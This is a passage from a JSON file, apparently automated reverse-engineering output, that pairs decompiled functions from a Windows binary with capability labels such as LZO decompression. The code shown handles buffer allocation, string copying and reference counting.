(**(*var_ch + 0x28))();\n    *(var_10h + 0x34) = uVar4;\n    return;\n}\n",
        "token_count": 1302
    },
    "004756f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004756f0(uint noname_0, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    uVar1 = (**(*arg_ch + 8))();\n    *(arg_10h + 0x11) = uVar1;\n    uVar1 = (**(*arg_ch + 0xc))();\n    *(arg_10h + 0x12) = uVar1;\n    uVar2 = (**(*arg_ch + 0x20))();\n    *(arg_10h + 8) = 0;\n    *(arg_10h + 0x2c) = uVar2;\n    *(arg_10h + 0x14) = 0;\n    *(arg_10h + 0x1c) = 0;\n    *(arg_10h + 0x24) = 0;\n    *(arg_10h + 0x43) = 1;\n    (**(*arg_ch + 0x10))(arg_ch);\n    iVar3 = fcn.004a34e0(var_2ch + 1);\n    fcn.00435590(iVar3, var_2ch, 0);\n    *(arg_10h + 0xc) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 8) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    (**(*arg_ch + 0x14))(arg_ch);\n    iVar3 = fcn.004a34e0(var_2ch + 1);\n    fcn.00435590(iVar3, var_2ch, 0);\n    *(arg_10h + 0x18) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 0x14) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    (**(*arg_ch + 0x18))(arg_ch);\n    iVar3 = fcn.004a34e0(var_2ch + 1);\n    fcn.00435590(iVar3, var_2ch, 0);\n    *(arg_10h + 0x20) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 0x1c) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    (**(*arg_ch + 0x1c))(arg_ch);\n    iVar3 = fcn.004a34e0(var_2ch + 1);\n    fcn.00435590(iVar3, var_2ch, 0);\n    *(arg_10h + 0x28) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 0x24) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    uVar2 = (**(*arg_ch + 0x24))();\n    *(arg_10h + 0x30) = uVar2;\n    uVar2 = (**(*arg_ch + 0x28))();\n    *(arg_10h + 0x34) = uVar2;\n    return;\n}\n",
        "token_count": 876
    },
    "004758f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004758f0(uint noname_0, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_2ch;\n    uchar var_1dh;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    uVar3 = (**(*arg_ch + 8))();\n    *(arg_10h + 0x11) = uVar3;\n    uVar3 = (**(*arg_ch + 0xc))();\n    *(arg_10h + 0x12) = uVar3;\n    uVar4 = (**(*arg_ch + 0x20))();\n    *(arg_10h + 8) = 0;\n    *(arg_10h + 0x2c) = uVar4;\n    *(arg_10h + 0x14) = 0;\n    *(arg_10h + 0x1c) = 0;\n    *(arg_10h + 0x24) = 0;\n    *(arg_10h + 0x43) = 1;\n    (**(*arg_ch + 0x10))(arg_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar5 = fcn.004a34e0(iVar2 + 1);\n    fcn.0042ca00(iVar5, iVar2, 0);\n    *(arg_10h + 0xc) = iVar2;\n    *(iVar5 + iVar2) = 0;\n    *(arg_10h + 8) = iVar5;\n    if (*0x4f59f4 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0046bf60(&var_1dh);\n    }\n    (**(*arg_ch + 0x14))(arg_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar5 = fcn.004a34e0(iVar2 + 1);\n    fcn.0042ca00(iVar5, iVar2, 0);\n    *(arg_10h + 0x18) = iVar2;\n    *(iVar5 + iVar2) = 0;\n    *(arg_10h + 0x14) = iVar5;\n    if (*0x4f59f4 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0046bf60(&var_1dh);\n    }\n    (**(*arg_ch + 0x18))(arg_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar5 = fcn.004a34e0(iVar2 + 1);\n    fcn.0042ca00(iVar5, iVar2, 0);\n    *(arg_10h + 0x20) = iVar2;\n    *(iVar5 + iVar2) = 0;\n    iVar2 = *0x4f59f4;\n    *(arg_10h + 0x1c) = iVar5;\n    if (iVar2 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0046bf60(&var_1dh);\n    }\n    (**(*arg_ch + 0x1c))(arg_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar6 = fcn.004a34e0(iVar2 + 1);\n    fcn.0042ca00(iVar6, iVar2, 0);\n    iVar5 = *0x4f59f4;\n    *(arg_10h + 0x28) = iVar2;\n    *(iVar6 + iVar2) = 0;\n    *(arg_10h + 0x24) = iVar6;\n    if (iVar5 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0046bf60(&var_1dh);\n    }\n    uVar4 = (**(*arg_ch + 0x24))();\n    *(arg_10h + 0x30) = uVar4;\n    uVar4 = (**(*arg_ch + 0x28))();\n    *(arg_10h + 0x34) = uVar4;\n    return;\n}\n",
        "token_count": 1283
    },
    "00475bd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00475bd0(uint noname_0, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    uVar1 = (**(*arg_ch + 8))();\n    *(arg_10h + 0x11) = uVar1;\n    uVar1 = (**(*arg_ch + 0xc))();\n    *(arg_10h + 0x12) = uVar1;\n    uVar2 = (**(*arg_ch + 0x20))();\n    *(arg_10h + 8) = 0;\n    *(arg_10h + 0x2c) = uVar2;\n    *(arg_10h + 0x14) = 0;\n    *(arg_10h + 0x1c) = 0;\n    *(arg_10h + 0x24) = 0;\n    *(arg_10h + 0x43) = 1;\n    (**(*arg_ch + 0x10))(arg_ch);\n    iVar3 = fcn.004a34e0(var_2ch + 1);\n    fcn.00435590(iVar3, var_2ch, 0);\n    *(arg_10h + 0xc) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 8) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    (**(*arg_ch + 0x14))(arg_ch);\n    iVar3 = fcn.004a34e0(var_2ch + 1);\n    fcn.00435590(iVar3, var_2ch, 0);\n    *(arg_10h + 0x18) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 0x14) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    (**(*arg_ch + 0x18))(arg_ch);\n    iVar3 = fcn.004a34e0(var_2ch + 1);\n    fcn.00435590(iVar3, var_2ch, 0);\n    *(arg_10h + 0x20) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 0x1c) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    (**(*arg_ch + 0x1c))(arg_ch);\n    iVar3 = fcn.004a34e0(var_2ch + 1);\n    fcn.00435590(iVar3, var_2ch, 0);\n    *(arg_10h + 0x28) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 0x24) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    uVar2 = (**(*arg_ch + 0x24))();\n    *(arg_10h + 0x30) = uVar2;\n    uVar2 = (**(*arg_ch + 0x28))();\n    *(arg_10h + 0x34) = uVar2;\n    return;\n}\n",
        "token_count": 876
    },
    "00475dd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_1ch_2\n\nvoid __cdecl\nfcn.00475dd0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint arg_ch, uint arg_10h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint *extraout_ECX;\n    uint32_t uVar8;\n    int32_t *var_ch_2;\n    int32_t var_10h_2;\n    uint var_ch;\n    uint var_10h;\n    uint var_2ch;\n    uint var_1ch;\n    uchar *puStack380;\n    int32_t iStack376;\n    uchar auStack372 [28];\n    int32_t iStack344;\n    int32_t *piStack340;\n    int32_t *piStack336;\n    uchar *puStack332;\n    int32_t iStack328;\n    uchar *puStack324;\n    int32_t *piStack320;\n    int32_t *piStack316;\n    uchar *puStack312;\n    uint uStack304;\n    int32_t iStack300;\n    int32_t *piStack296;\n    uint uStack292;\n    int32_t iStack272;\n    int32_t *piStack268;\n    uchar auStack253 [17];\n    int32_t *piStack236;\n    int32_t *piStack232;\n    uint32_t uStack228;\n    uchar *puStack224;\n    int32_t *piStack220;\n    int32_t *piStack216;\n    int32_t *piStack212;\n    int32_t iStack208;\n    int32_t iStack204;\n    int32_t *piStack200;\n    uint uStack196;\n    int32_t iStack176;\n    int32_t *piStack172;\n    int32_t *piStack160;\n    int32_t *piStack156;\n    int32_t aiStack152 [7];\n    int32_t iStack124;\n    int32_t *piStack120;\n    int32_t *piStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    int32_t *piStack100;\n    int32_t *piStack96;\n    int32_t iStack92;\n    uint uStack84;\n    int32_t iStack80;\n    int32_t *piStack76;\n    uint uStack72;\n    int32_t var_30h_2;\n    int32_t *var_2ch_3;\n    uint var_28h_2;\n    uint var_3ch;\n    int32_t var_1ch_3;\n    uint var_30h;\n    uint var_2ch_2;\n    uint var_28h;\n    uint var_1ch_2;\n    \n    iStack80 = 0x475de6;\n    uVar1 = (**(*var_ch_2 + 8))();\n    *(var_10h_2 + 0x12) = uVar1;\n    iStack80 = 0x475df1;\n    uVar1 = (**(*var_ch_2 + 0xc))();\n    *(var_10h_2 + 0x14) = uVar1;\n    iStack80 = 0x475dfc;\n    uVar2 = (**(*var_ch_2 + 0x20))();\n    *(var_10h_2 + 8) = 0;\n    *(var_10h_2 + 0x30) = uVar2;\n    *(var_10h_2 + 0x18) = 0;\n    *(var_10h_2 + 0x20) = 0;\n    *(var_10h_2 + 0x28) = 0;\n    *(var_10h_2 + 0x52) = 1;\n    piStack76 = var_ch_2;\n    iStack80 = 0x475e2a;\n    (**(*var_ch_2 + 0x10))();\n    iVar4 = *(var_1ch_3 + -0xc);\n    iStack80 = iVar4 + 1;\n    uStack84 = 0x475e3e;\n    iStack80 = fcn.004a34e0();\n    uStack72 = 0;\n    uStack84 = 0x475e58;\n    piStack76 = iVar4;\n    var_2ch_3 = iStack80;\n    fcn.0042ca00();\n    *(var_10h_2 + 0xc) = iVar4;\n    *(var_2ch_3 + iVar4) = 0;\n    *(var_10h_2 + 8) = var_2ch_3;\n    if (*0x4f59f4 == 0) {\n        iVar4 = *(var_1ch_3 + -4);\n        *(var_1ch_3 + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = var_1ch_3 + -4;\n        iVar4 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (iVar4 < 1) {\n        iStack92 = &fcn.00475dd0::var_3ch + 3;\n        piStack96 = 0x476060;\n        fcn.0046bf60();\n    }\n    piStack96 = var_ch_2;\n    piStack100 = 0x475e94;\n    (**(*var_ch_2 + 0x14))();\n    var_2ch_3 = *(var_1ch_3 + -0xc);\n    uVar8 = var_2ch_3 + 1;\n    if (uVar8 < 0x3fffffff) {\n        piStack100 = uVar8 * 2;\n        iStack104 = 0x475ebd;\n        var_30h_2 = piStack100;\n        piVar3 = fcn.004a34e0();\n        iStack92 = 0;\n        piStack96 = var_2ch_3;\n        iStack104 = 0x475ed9;\n        piStack100 = piVar3;\n        fcn.0042bb20();\n        *(var_10h_2 + 0x18) = piVar3;\n        *(piVar3 + var_30h_2 + -2) = 0;\n        *(var_10h_2 + 0x1c) = var_2ch_3;\n        if (*0x4f59f4 == 0) {\n            iVar4 = *(var_1ch_3 + -4);\n            *(var_1ch_3 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = var_1ch_3 + -4;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            puStack112 = &fcn.00475dd0::var_3ch + 3;\n            piStack116 = 0x476090;\n            fcn.004640a0();\n        }\n        piStack116 = var_ch_2;\n        piStack120 = 0x475f1b;\n        (**(*var_ch_2 + 0x18))();\n        var_2ch_3 = *(var_1ch_3 + -0xc);\n        uVar8 = var_2ch_3 + 1;\n        if (0x3ffffffe < uVar8) goto code_r0x0047611f;\n        iStack108 = 0x475f40;\n        iStack104 = uVar8 * 2;\n        iStack104 = fcn.004a34e0();\n        piStack96 = NULL;\n        piStack100 = var_2ch_3;\n        iStack108 = 0x475f5f;\n        var_30h_2 = iStack104;\n        fcn.0042bb20();\n        *(var_30h_2 + -2 + uVar8 * 2) = 0;\n        iVar4 = *0x4f59f4;\n        *(var_10h_2 + 0x20) = var_30h_2;\n        *(var_10h_2 + 0x24) = var_2ch_3;\n        if (iVar4 == 0) {\n            iVar4 = *(var_1ch_3 + -4);\n            *(var_1ch_3 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = var_1ch_3 + -4;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            piStack116 = &fcn.00475dd0::var_3ch + 3;\n            piStack120 = 0x4760c0;\n            fcn.004640a0();\n        }\n        piStack120 = var_ch_2;\n        iStack124 = 0x475fa1;\n        (**(*var_ch_2 + 0x1c))();\n        var_2ch_3 = *(var_1ch_3 + -0xc);\n        uVar8 = var_2ch_3 + 1;\n        if (uVar8 < 0x3fffffff) {\n            iStack104 = uVar8 * 2;\n            iStack108 = 0x475fca;\n            var_30h_2 = iStack104;\n            iVar4 = fcn.004a34e0();\n            piStack96 = NULL;\n            piStack100 = var_2ch_3;\n            iStack108 = 0x475fe6;\n            iStack104 = iVar4;\n            fcn.0042bb20();\n            *(var_10h_2 + 0x28) = iVar4;\n            *(iVar4 + -2 + var_30h_2) = 0;\n            iVar4 = *0x4f59f4;\n            *(var_10h_2 + 0x2c) = var_2ch_3;\n            if (iVar4 == 0) {\n                iVar4 = *(var_1ch_3 + -4);\n                *(var_1ch_3 + -4) = iVar4 + -1;\n            }\n            else {\n                LOCK();\n                piVar3 = var_1ch_3 + -4;\n                iVar4 = *piVar3;\n                *piVar3 = *piVar3 + -1;\n            }\n            if (iVar4 < 1) {\n                piStack116 = &fcn.00475dd0::var_3ch + 3;\n                piStack120 = 0x4760f0;\n                fcn.004640a0();\n            }\n            iStack124 = 0x476025;\n            uVar2 = (**(*var_ch_2 + 0x24))();\n            *(var_10h_2 + 0x34) = uVar2;\n            iStack124 = 0x47602f;\n            uVar2 = (**(*var_ch_2 + 0x28))();\n            *(var_10h_2 + 0x38) = uVar2;\n            return;\n        }\n        iStack108 = 0x476131;\n        fcn.004a3c30();\n    }\n    else {\n        iStack104 = 0x476105;\n        fcn.004a3c30();\n        piStack100 = &fcn.00475dd0::var_3ch + 3;\n        iStack104 = 0x476116;\n        fcn.0046bf80();\n        iStack104 = var_10h_2;\n        iStack108 = 0x47611f;\n        fcn.0041b360();\ncode_r0x0047611f:\n        iStack108 = 0x476124;\n        var_10h_2 = fcn.004a3c30();\n    }\n    iStack104 = &fcn.00475dd0::var_3ch + 3;\n    iStack108 = 0x476142;\n    fcn.004640c0();\n    puStack112 = 0x47614b;\n    iStack108 = var_10h_2;\n    fcn.0041b360();\n    piVar5 = piStack96;\n    piVar6 = piStack100;\n    piStack120 = var_ch_2;\n    iStack204 = 0x476166;\n    iStack124 = var_10h_2;\n    piStack116 = uVar8;\n    puStack112 = &fcn.00475dd0::var_1ch_2;\n    uVar1 = (**(*piStack100 + 8))();\n    *(piVar5 + 0x12) = uVar1;\n    iStack204 = 0x476171;\n    uVar1 = (**(*piVar6 + 0xc))();\n    *(piVar5 + 5) = uVar1;\n    iStack204 = 0x47617c;\n    iVar4 = (**(*piVar6 + 0x20))();\n    piVar5[2] = 0;\n    piVar5[0xc] = iVar4;\n    piVar5[6] = 0;\n    piVar5[8] = 0;\n    piVar5[10] = 0;\n    *(piVar5 + 0x52) = 1;\n    piStack200 = piVar6;\n    iStack204 = 0x4761aa;\n    (**(*piVar6 + 0x10))();\n    piVar3 = piStack156;\n    iStack204 = piStack156 + 1;\n    iStack208 = 0x4761bb;\n    iStack204 = fcn.004a34e0();\n    uStack196 = 0;\n    piStack200 = piVar3;\n    iStack208 = 0x4761d5;\n    piStack172 = iStack204;\n    fcn.00435590();\n    piVar5[3] = piVar3;\n    *(piStack172 + piVar3) = 0;\n    piVar5[2] = piStack172;\n    if (piStack160 != &stack0xffffff68) {\n        piStack216 = piStack160;\n        piStack220 = 0x4761f7;\n        fcn.004a34c0();\n    }\n    piStack216 = piVar6;\n    piStack220 = 0x476202;\n    (**(*piVar6 + 0x14))();\n    uStack228 = piStack156 + 1;\n    piStack172 = piStack156;\n    if (uStack228 < 0x3fffffff) {\n        piStack220 = uStack228 * 2;\n        puStack224 = 0x476228;\n        iStack176 = piStack220;\n        iVar4 = fcn.004a34e0();\n        piStack212 = NULL;\n        piStack216 = piStack172;\n        puStack224 = 0x476244;\n        piStack220 = iVar4;\n        fcn.00436340();\n        piVar5[6] = iVar4;\n        piVar5[7] = piStack172;\n        *(iVar4 + -2 + iStack176) = 0;\n        if (piStack160 != &stack0xffffff68) {\n            piStack232 = piStack160;\n            piStack236 = 0x47626c;\n            fcn.004a34c0();\n        }\n        piStack232 = piVar6;\n        piStack236 = 0x476277;\n        (**(*piVar6 + 0x18))();\n        uStack228 = piStack156 + 1;\n        piStack172 = piStack156;\n        if (0x3ffffffe < uStack228) goto code_r0x00476387;\n        puStack224 = 0x476299;\n        piStack220 = uStack228 * 2;\n        piStack220 = fcn.004a34e0();\n        piStack212 = NULL;\n        piStack216 = piStack172;\n        puStack224 = 0x4762b8;\n        iStack176 = piStack220;\n        fcn.00436340();\n        *(iStack176 + -2 + uStack228 * 2) = 0;\n        piVar5[8] = iStack176;\n        piVar5[9] = piStack172;\n        if (piStack160 != &stack0xffffff68) {\n            piStack232 = piStack160;\n            piStack236 = 0x4762e0;\n            fcn.004a34c0();\n        }\n        piStack232 = piVar6;\n        piStack236 = 0x4762eb;\n        (**(*piVar6 + 0x1c))();\n        uStack228 = piStack156 + 1;\n        piStack172 = piStack156;\n        if (uStack228 < 0x3fffffff) {\n            piStack220 = uStack228 * 2;\n            puStack224 = 0x47630d;\n            iStack176 = piStack220;\n            iVar4 = fcn.004a34e0();\n            piStack212 = NULL;\n            piStack216 = piStack172;\n            puStack224 = 0x476329;\n            piStack220 = iVar4;\n            fcn.00436340();\n            piVar5[10] = iVar4;\n            *(iVar4 + -2 + iStack176) = 0;\n            piVar5[0xb] = piStack172;\n            if (piStack160 != &stack0xffffff68) {\n                piStack232 = piStack160;\n                piStack236 = 0x476351;\n                fcn.004a34c0();\n            }\n            piStack236 = 0x476358;\n            iVar4 = (**(*piVar6 + 0x24))();\n            piVar5[0xd] = iVar4;\n            piStack236 = 0x476362;\n            iVar4 = (**(*piVar6 + 0x28))();\n            piVar5[0xe] = iVar4;\n            return;\n        }\n        puStack224 = 0x47637a;\n        piVar5 = fcn.004a3c30();\n    }\n    else {\n        puStack224 = 0x476387;\n        fcn.004a3c30();\ncode_r0x00476387:\n        puStack224 = 0x47638c;\n        fcn.004a3c30();\n    }\n    if (piStack160 != &stack0xffffff68) {\n        piStack220 = piStack160;\n        puStack224 = 0x47639e;\n        fcn.004a34c0();\n    }\n    puStack224 = 0x4763a6;\n    piStack220 = piVar5;\n    fcn.0041b360();\n    iVar7 = iStack208;\n    piVar3 = piStack212;\n    piStack232 = piVar6;\n    iStack300 = 0x4763c6;\n    piStack236 = piVar5;\n    puStack224 = &stack0xffffff90;\n    uVar1 = (**(*piStack212 + 8))();\n    *(iVar7 + 0x12) = uVar1;\n    iStack300 = 0x4763d1;\n    uVar1 = (**(*piVar3 + 0xc))();\n    *(iVar7 + 0x14) = uVar1;\n    iStack300 = 0x4763dc;\n    uVar2 = (**(*piVar3 + 0x20))();\n    *(iVar7 + 8) = 0;\n    *(iVar7 + 0x30) = uVar2;\n    *(iVar7 + 0x18) = 0;\n    *(iVar7 + 0x20) = 0;\n    *(iVar7 + 0x28) = 0;\n    *(iVar7 + 0x52) = 1;\n    piStack296 = piVar3;\n    iStack300 = 0x47640a;\n    (**(*piVar3 + 0x10))();\n    iVar4 = *(auStack253._1_4_ + -0xc);\n    iStack300 = iVar4 + 1;\n    uStack304 = 0x47641e;\n    iStack300 = fcn.004a34e0();\n    uStack292 = 0;\n    uStack304 = 0x476438;\n    piStack296 = iVar4;\n    piStack268 = iStack300;\n    fcn.0042ca00();\n    *(iVar7 + 0xc) = iVar4;\n    *(piStack268 + iVar4) = 0;\n    *(iVar7 + 8) = piStack268;\n    if (*0x4f59f4 == 0) {\n        iVar4 = *(auStack253._1_4_ + -4);\n        *(auStack253._1_4_ + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar6 = auStack253._1_4_ + -4;\n        iVar4 = *piVar6;\n        *piVar6 = *piVar6 + -1;\n    }\n    if (iVar4 < 1) {\n        puStack312 = &stack0xffffff03;\n        piStack316 = 0x476640;\n        fcn.0046bf60();\n    }\n    piStack316 = piVar3;\n    piStack320 = 0x476474;\n    (**(*piVar3 + 0x14))();\n    piStack268 = *(auStack253._1_4_ + -0xc);\n    uVar8 = piStack268 + 1;\n    if (uVar8 < 0x3fffffff) {\n        piStack320 = uVar8 * 2;\n        puStack324 = 0x47649d;\n        iStack272 = piStack320;\n        piVar6 = fcn.004a34e0();\n        puStack312 = NULL;\n        piStack316 = piStack268;\n        puStack324 = 0x4764b9;\n        piStack320 = piVar6;\n        fcn.0042bb20();\n        *(iVar7 + 0x18) = piVar6;\n        *(piVar6 + iStack272 + -2) = 0;\n        *(iVar7 + 0x1c) = piStack268;\n        if (*0x4f59f4 == 0) {\n            iVar4 = *(auStack253._1_4_ + -4);\n            *(auStack253._1_4_ + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar6 = auStack253._1_4_ + -4;\n            iVar4 = *piVar6;\n            *piVar6 = *piVar6 + -1;\n        }\n        if (iVar4 < 1) {\n            puStack332 = &stack0xffffff03;\n            piStack336 = 0x476670;\n            fcn.004640a0();\n        }\n        piStack336 = piVar3;\n        piStack340 = 0x4764fb;\n        (**(*piVar3 + 0x18))();\n        piStack268 = *(auStack253._1_4_ + -0xc);\n        uVar8 = piStack268 + 1;\n        if (0x3ffffffe < uVar8) goto code_r0x004766ff;\n        iStack328 = 0x476520;\n        puStack324 = uVar8 * 2;\n        puStack324 = fcn.004a34e0();\n        piStack316 = NULL;\n        piStack320 = piStack268;\n        iStack328 = 0x47653f;\n        iStack272 = puStack324;\n        fcn.0042bb20();\n        *(iStack272 + -2 + uVar8 * 2) = 0;\n        iVar4 = *0x4f59f4;\n        *(iVar7 + 0x20) = iStack272;\n        *(iVar7 + 0x24) = piStack268;\n        if (iVar4 == 0) {\n            iVar4 = *(auStack253._1_4_ + -4);\n            *(auStack253._1_4_ + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar6 = auStack253._1_4_ + -4;\n            iVar4 = *piVar6;\n            *piVar6 = *piVar6 + -1;\n        }\n        if (iVar4 < 1) {\n            piStack336 = &stack0xffffff03;\n            piStack340 = 0x4766a0;\n            fcn.004640a0();\n        }\n        piStack340 = piVar3;\n        iStack344 = 0x476581;\n        (**(*piVar3 + 0x1c))();\n        piStack268 = *(auStack253._1_4_ + -0xc);\n        uVar8 = piStack268 + 1;\n        if (uVar8 < 0x3fffffff) {\n            puStack324 = uVar8 * 2;\n            iStack328 = 0x4765aa;\n            iStack272 = puStack324;\n            iVar4 = fcn.004a34e0();\n            piStack316 = NULL;\n            piStack320 = piStack268;\n            iStack328 = 0x4765c6;\n            puStack324 = iVar4;\n            fcn.0042bb20();\n            *(iVar7 + 0x28) = iVar4;\n            *(iVar4 + -2 + iStack272) = 0;\n            iVar4 = *0x4f59f4;\n            *(iVar7 + 0x2c) = piStack268;\n            if (iVar4 == 0) {\n                iVar4 = *(auStack253._1_4_ + -4);\n                *(auStack253._1_4_ + -4) = iVar4 + -1;\n            }\n            else {\n                LOCK();\n                piVar6 = auStack253._1_4_ + -4;\n                iVar4 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n            }\n            if (iVar4 < 1) {\n                piStack336 = &stack0xffffff03;\n                piStack340 = 0x4766d0;\n                fcn.004640a0();\n            }\n            iStack344 = 0x476605;\n            uVar2 = (**(*piVar3 + 0x24))();\n            *(iVar7 + 0x34) = uVar2;\n            iStack344 = 0x47660f;\n            uVar2 = (**(*piVar3 + 0x28))();\n            *(iVar7 + 0x38) = uVar2;\n            return;\n        }\n        iStack328 = 0x476711;\n        fcn.004a3c30();\n    }\n    else {\n        puStack324 = 0x4766e5;\n        fcn.004a3c30();\n        piStack320 = &stack0xffffff03;\n        puStack324 = 0x4766f6;\n        fcn.0046bf80();\n        puStack324 = iVar7;\n        iStack328 = 0x4766ff;\n        fcn.0041b360();\ncode_r0x004766ff:\n        iStack328 = 0x476704;\n        iVar7 = fcn.004a3c30();\n    }\n    puStack324 = &stack0xffffff03;\n    iStack328 = 0x476722;\n    fcn.004640c0();\n    puStack332 = 0x47672b;\n    iStack328 = iVar7;\n    fcn.0041b360();\n    piVar5 = piStack316;\n    piVar6 = piStack320;\n    piStack340 = piVar3;\n    iStack344 = iVar7;\n    piStack336 = uVar8;\n    puStack332 = &stack0xffffff20;\n    uVar1 = (**(*piStack320 + 8))();\n    *(piVar5 + 0x12) = uVar1;\n    uVar1 = (**(*piVar6 + 0xc))();\n    *(piVar5 + 5) = uVar1;\n    iVar4 = (**(*piVar6 + 0x20))();\n    piVar5[2] = 0;\n    piVar5[0xc] = iVar4;\n    piVar5[6] = 0;\n    piVar5[8] = 0;\n    piVar5[10] = 0;\n    *(piVar5 + 0x52) = 1;\n    (**(*piVar6 + 0x10))(piVar6);\n    iVar4 = fcn.004a34e0(iStack376 + 1);\n    fcn.00435590(iVar4, iStack376, 0);\n    piVar5[3] = iStack376;\n    *(iVar4 + iStack376) = 0;\n    piVar5[2] = iVar4;\n    if (puStack380 != &stack0xfffffe8c) {\n        fcn.004a34c0(puStack380);\n    }\n    (**(*piVar6 + 0x14))(piVar6);\n    if (iStack376 + 1U < 0x3fffffff) {\n        iVar4 = (iStack376 + 1U) * 2;\n        iVar7 = fcn.004a34e0(iVar4);\n        fcn.00436340(iVar7, iStack376, 0);\n        piVar5[6] = iVar7;\n        piVar5[7] = iStack376;\n        *(iVar7 + -2 + iVar4) = 0;\n        if (puStack380 != &stack0xfffffe8c) {\n            fcn.004a34c0(puStack380);\n        }\n        (**(*piVar6 + 0x18))(piVar6);\n        if (iStack376 + 1U < 0x3fffffff) {\n            iVar4 = (iStack376 + 1U) * 2;\n            iVar7 = fcn.004a34e0(iVar4);\n            fcn.00436340(iVar7, iStack376, 0);\n            *(iVar7 + -2 + iVar4) = 0;\n            piVar5[8] = iVar7;\n            piVar5[9] = iStack376;\n            if (puStack380 != &stack0xfffffe8c) {\n                fcn.004a34c0(puStack380);\n            }\n            (**(*piVar6 + 0x1c))(piVar6);\n            if (iStack376 + 